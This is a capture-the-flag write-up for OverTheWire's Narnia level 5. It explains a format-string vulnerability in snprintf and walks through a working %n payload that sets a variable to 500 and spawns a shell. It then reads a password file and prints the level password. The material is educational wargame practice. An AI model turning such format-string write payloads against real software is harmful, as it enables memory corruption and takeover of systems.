# Narnia Level 5 → 6

## Goal

A local `int i = 1` needs to become the number **500**. The binary calls `snprintf(buffer, sizeof buffer, argv[1])` — no format string, argv[1] is the format. That's a classic **format-string vulnerability**, and `%n` lets you *write* a number to an address you control.

## Concepts you'll learn

- Format-string vulnerabilities — why `printf(user_input)` is a write primitive
- The `%n` specifier: writes the number of bytes printed so far into the address at the matching argument slot
- Direct parameter access with `%N$` and field-width padding (`%500x`) to set the `%n` value to any number you want

## Walkthrough

### 1. Read the source

```c
int main(int argc, char *argv[]){
    int i = 1;
    char buffer[64];

    snprintf(buffer, sizeof buffer, argv[1]);
    buffer[sizeof(buffer)-1] = 0;
    printf("Change i's value from 1 -> 500. ");

    if(i == 500){
        printf("GOOD\n");
        system("/bin/sh");
    }
    printf("No way...let me give you a hint!\n");
    printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
    printf("i = %d (%p)\n", i, &i);
    return 0;
}
```

Crucially, the binary **prints the address of `i`** for you. Run it once to see:

```bash
$ /narnia/narnia5 hello
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [hello] (5)
i = 1 (0xffffd6d0)
```

`i` lives at `0xffffd6d0` on this run. Your job: make `snprintf(buffer, ..., argv[1])` write `500` to that address.

### 2. Find where your input sits on the stack

Try `%x %x %x %x ...` to enumerate stack values until you see your own string reflected back:

```bash
$ /narnia/narnia5 "AAAA %x %x %x %x %x %x %x %x"
AAAA c ffffd6c0 f7e3e980 f7fa3580 [more] 41414141 ...
```

When `41414141` appears (your `AAAA`), count how many `%x` preceded it — that's the parameter index. For this binary, index 1 usually works: `%1$n`.

### 3. Build the payload

You want to:

- Put the address `0xffffd6d0` at the start of your input (4 bytes).
- Use `%N$x` padding to make the byte count reach 500.
- Then `%1$n` to write that byte count into the address at parameter 1.

Address bytes (little-endian): `\xd0\xd6\xff\xff`. That's 4 bytes. So the remaining padding needs to be 500 - 4 = **496**. Use `%496x`:

```bash
$ P=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xd0\xd6\xff\xff" + b"%496x%1$n")')
$ /narnia/narnia5 "$P"
Change i's value from 1 -> 500. GOOD
$ whoami
narnia6
$ cat /etc/narnia_pass/narnia6
neezocaeng
```

> Beware ASLR: `i`'s address will change slightly from run to run. Read the address the binary prints each time, build the payload against that address, fire.

## The answer

The password for `narnia6` is:

**`neezocaeng`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/narnia/narnia5.html>
